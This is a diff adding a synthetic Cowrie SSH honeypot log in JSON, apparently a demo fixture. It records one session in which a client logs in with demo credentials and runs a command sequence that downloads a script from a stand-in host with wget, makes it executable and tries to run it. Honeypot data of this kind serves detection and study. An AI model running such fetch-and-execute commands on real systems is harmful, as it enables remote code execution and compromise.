@@ -1,0 +1,148 @@
+{
+    "0ce16882846d": [
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.session.connect",
+            "src_port": 47020,
+            "dst_ip": "172.22.0.1",
+            "dst_port": 2222,
+            "timestamp": "2026-11-12T06:52:43.299705Z",
+            "message": "New connection: 172.22.0.2:47020 (172.22.0.1:2222) [session: 0ce16882846d]"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.client.version",
+            "version": "SSH-2.0-Twisted_25.5.0",
+            "timestamp": "2026-11-12T06:52:43.329705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.client.kex",
+            "timestamp": "2026-11-12T06:52:43.379705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.login.success",
+            "username": "demo",
+            "password": "demo-pass",
+            "timestamp": "2026-11-12T06:52:43.779705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.client.size",
+            "width": 80,
+            "height": 24,
+            "timestamp": "2026-11-12T06:52:44.279705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.session.params",
+            "timestamp": "2026-11-12T06:52:44.329705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.command.input",
+            "input": "uname -a",
+            "timestamp": "2026-11-12T06:52:46.279705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.command.input",
+            "input": "wget http://files.example/x.sh -O x.sh",
+            "timestamp": "2026-11-12T06:52:47.779705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.command.input",
+            "input": "chmod +x x.sh",
+            "timestamp": "2026-11-12T06:52:49.279705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.command.input",
+            "input": "./x.sh",
+            "timestamp": "2026-11-12T06:52:50.779705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.command.failed",
+            "input": "./x.sh",
+            "timestamp": "2026-11-12T06:52:50.789705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.command.input",
+            "input": "exit",
+            "timestamp": "2026-11-12T06:52:52.279705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.log.closed",
+            "size": 838,
+            "duration": 9.0,
+            "timestamp": "2026-11-12T06:52:52.289705Z"
+        },
+        {
+            "session": "0ce16882846d",
+            "src_ip": "172.22.0.2",
+            "sensor": "SYNTHETIC-DEMO",
+            "protocol": "ssh",
+            "synthetic": true,
+            "eventid": "cowrie.session.closed",
+            "duration": "9.0",
+            "timestamp": "2026-11-12T06:52:52.299705Z"
+        }
+    ]
+}
